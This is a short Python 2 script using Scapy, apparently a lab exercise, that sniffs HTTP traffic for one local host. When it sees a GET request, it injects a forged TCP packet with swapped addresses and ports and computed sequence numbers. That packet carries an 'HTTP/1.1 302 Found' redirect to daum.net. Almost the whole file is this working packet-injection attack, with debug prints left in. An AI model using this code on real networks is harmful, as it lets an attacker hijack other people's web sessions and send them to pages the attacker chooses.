from scapy.all import *	

def http_302_inject(pkt):
		inject_packet = pkt.copy()
		string = 'HTTP/1.1 302 Found\r\n'
		string += 'Location: http://www.daum.net\r\n'
#		string += '\r\n'
		print'***************************'
		inject_packet.show()
		print'***************************'
		seq_plus =len(pkt[Raw].load)
		print '*<*<*>*&<*<&*<&*<&>*&8'
		print string
		print len(string)
		inject_packet[Ether].src = pkt[Ether].dst
		inject_packet[Ether].dst = pkt[Ether].src
		inject_packet[IP].src = pkt[IP].dst
		inject_packet[IP].dst = pkt[IP].src
#		inject_packet[IP].len = 52 + len(string)
		inject_packet[TCP].sport = pkt[TCP].dport
		inject_packet[TCP].dport = pkt[TCP].sport
		inject_packet[TCP].seq = pkt[TCP].ack
		inject_packet[TCP].ack = pkt[TCP].seq + seq_plus
		inject_packet[TCP].flags = 'FA'
		inject_packet[Raw].load = string
		inject_packet.show()
		sendp(inject_packet)
		
def http_monitor(pkt):
	if pkt.haslayer(Raw):
		raw_data = str(pkt[Raw].load)
		if 'GET' in raw_data:
			pkt.show()
			http_302_inject(pkt)

my_ip = '192.168.32.43'
sniff(prn=http_monitor, filter='host 192.168.32.43 and tcp port 80',store=0)
